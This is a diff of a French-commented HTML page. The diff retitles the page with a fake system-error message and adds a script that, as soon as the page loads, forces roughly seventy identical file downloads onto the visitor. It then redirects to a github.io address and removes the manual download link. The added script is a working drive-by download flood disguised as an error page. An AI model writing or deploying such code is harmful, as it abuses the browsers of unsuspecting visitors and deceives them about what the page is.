@@ -1,27 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Téléchargement automatique + redirection</title>
+    <title>Erreur syteme failed</title>
 </head>
 <body>
 
 <script>
     window.onload = function() {
-        const link = document.createElement('a');
-        link.href = 'A.txt';
-        link.download = 'A.txt';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
+        const fichiers = ['A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', 'A.txt', ]; // Ajoute ici tous les fichiers à télécharger
 
-        // Redirection après un court délai pour laisser le téléchargement démarrer
+        fichiers.forEach(function(fichier) {
+            const link = document.createElement('a');
+            link.href = fichier;
+            link.download = fichier;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        });
+
+        // Redirection après un court délai
         setTimeout(function() {
-            window.location.href = 'https://balou201.github.io/Test6348/';  // Remplace par ton URL
-        }, 1); // 1 seconde de délai, tu peux ajuster
+            window.location.href = 'https://balou201.github.io/Test6348/'; // Remplace par ton URL cible
+        }, 1); // 1.5 seconde de délai
     };
 </script>
 
-<p>Si le téléchargement ne démarre pas automatiquement, <a href="A.txt" download="A.txt">cliquez ici</a>.</p>
-
 </body>
 </html>
+
